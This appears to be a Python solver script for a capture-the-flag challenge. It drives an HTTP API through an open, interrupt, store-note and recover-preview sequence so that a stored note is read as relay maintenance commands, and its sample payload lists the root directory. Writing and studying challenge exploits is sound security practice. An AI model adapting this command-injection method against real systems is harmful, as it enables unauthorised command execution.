#!/usr/bin/env python3
import json, sys, urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://orphaned-context-2cc1512386ef.chall.hiddeninvestigations.net"

def post(path, obj):
    req = urllib.request.Request(BASE + path, method="POST",
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())

def get(path):
    req = urllib.request.Request(BASE + path, headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def main():
    note = sys.argv[2] if len(sys.argv) > 2 else "#!relay-maint/1\nhelp\nls /"
    st, o = post("/api/capture/open", {})
    print("open:", json.dumps(o, indent=2))
    rid, slot, epoch, desc = o["request_id"], o["slot"], o["epoch"], o["recovery_descriptor"]
    print("desc len", len(desc))
    st, r = post("/api/capture/interrupt", {"request_id": rid})
    print("interrupt:", json.dumps(r))
    st, n = post("/api/note/store", {"text": note})
    print("note:", json.dumps(n))
    st, p = post("/api/recover/preview", {"recovery_descriptor": desc})
    print("preview status", st, ":", json.dumps(p, indent=2))
    print("STATUS:", json.dumps(get("/api/relay/status")["slots"]))

main()
